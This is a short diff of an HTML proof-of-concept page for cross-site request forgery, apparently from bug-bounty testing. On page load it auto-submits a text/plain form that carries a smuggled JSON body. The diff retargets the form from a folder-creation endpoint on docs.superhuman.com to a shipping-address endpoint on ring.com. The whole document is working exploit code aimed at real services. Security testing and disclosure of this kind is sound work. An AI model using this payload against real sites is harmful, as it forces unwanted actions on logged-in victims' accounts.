@@ -5,13 +5,13 @@
     <script>
       $(document).ready(
         function() {
-          $("#z").attr("name",'{"name":"test-csrf","icon":null,"iconColor":null,"description":"csrf-attack","fakeparam":"');
+          $("#z").attr("name",'{"country":"FR","phoneCode":33,"phone":"7 65 78 90 67","fullName":"no idea","email":"theidm+1@wearehackerone.com","confirmEmail":"theidm+1@wearehackerone.com","addressFirst":"10 Rue de la Paix","addressSecond":"an other address","company":"Test SARL","city":"lyon","state":"paris","zip":"75002","instructions":"","isDefault":true,"fakeparam":"');
           $('#f').trigger('submit');
       });
     </script>
   </head>
 <body>
-  <form id="f" ENCTYPE="text/plain" action="https://docs.superhuman.com/internalAppApi/workspaces/ws-96RE0OTDqM/folders" method="post">
+  <form id="f" ENCTYPE="text/plain" action="https://ring.com/fr/fr/shop/address" method="post">
     <input id="z" type="hidden" name='test' value='test"}'>
   </form>
 </body>
